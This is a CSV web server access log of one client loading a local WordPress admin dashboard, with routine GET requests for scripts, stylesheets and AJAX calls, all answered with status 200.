timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,6906,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/postbox.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/vendor/moment.min.js?ver=2.29.4,"""http://localhost:8080/wp-admin/""",200,18869,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/dashboard.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,3406,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105,"""http://localhost:8080/wp-admin/""",200,4345,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/dist/date.min.js?ver=e923a564a0407e0c2ffcbd348817ca86,"""http://localhost:8080/wp-admin/""",200,33285,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/plugin-install.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1364,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-sanitize.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,626,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/updates.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,9413,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/media-upload.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,954,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/js/svg-painter.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2469,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/shortcode.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1487,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wp-auth-check.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1115,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/heartbeat.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/wplink.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,4226,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3238,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-includes/js/thickbox/loadingAnimation.gif,"""http://localhost:8080/wp-admin/""",200,15525,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=1&_ajax_nonce=ae20010ade&1666708327987,"""http://localhost:8080/wp-admin/""",200,1066,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=no&_ajax_nonce=ae20010ade&1666708328075,"""http://localhost:8080/wp-admin/""",200,444,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:08,172.18.1.1,GET,/wp-admin/admin-ajax.php?action=dashboard-widgets&widget=dashboard_primary&pagenow=dashboard,"""http://localhost:8080/wp-admin/""",200,595,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:47,172.18.1.1,GET,/wp-admin/,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,18037,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/thickbox/thickbox.css?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1275,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,"/wp-admin/load-styles.php?c=0&dir=ltr&load%5Bchunk_0%5D=dashicons,admin-bar,site-health,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check&ver=6.0.3","""http://localhost:8080/wp-admin/""",200,100689,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
